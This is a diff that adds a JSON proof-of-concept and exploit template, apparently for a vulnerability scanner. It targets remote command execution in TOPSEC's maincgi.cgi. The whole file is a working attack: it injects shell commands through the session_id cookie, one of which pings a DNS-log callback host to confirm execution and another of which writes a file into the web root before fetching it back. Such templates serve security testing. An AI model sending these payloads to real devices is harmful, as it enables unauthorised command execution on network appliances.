@@ -1,0 +1,46 @@
+{
+	"name":"天融信TOPSEC_maincgi.cgi远程命令执行",
+	"tag":"topsec",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/cgi/maincgi.cgi?Url=check",
+		"header":{
+			"Cookie":" session_id_443=1|ping -nc 1 {{dnslog}}",
+			"Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+			"Upgrade-Insecure-Requests":" 1",
+			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; WOW64; rv",
+			"Connection":" close",
+			"Accept-Language":" zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
+			"Accept-Encoding":" gzip, deflate",
+			"Dnt":" 1"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	},
+	"exp":{
+		"step1":{
+			"expGet":"/cgi/maincgi.cgi?Url=check",
+			"header":{
+				"Cookie":" session_id_443=1|echo 'This a vulnerability!' >> /www/htdocs/site/image/hard.txt;",
+				"Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+				"Upgrade-Insecure-Requests":" 1",
+				"User-Agent":" Mozilla/5.0 (Windows NT 10.0; WOW64; rv",
+				"Connection":" close",
+				"Accept-Language":" zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
+				"Accept-Encoding":" gzip, deflate",
+				"Dnt":" 1"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		},
+		"step2":{
+			"expGet":"/site/image/hard.txt",
+			"header":{
+				"User-Agent":"Mozilla/5.0 (Linux;",
+				"content-type":"text/plain"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		}
+	}
+}
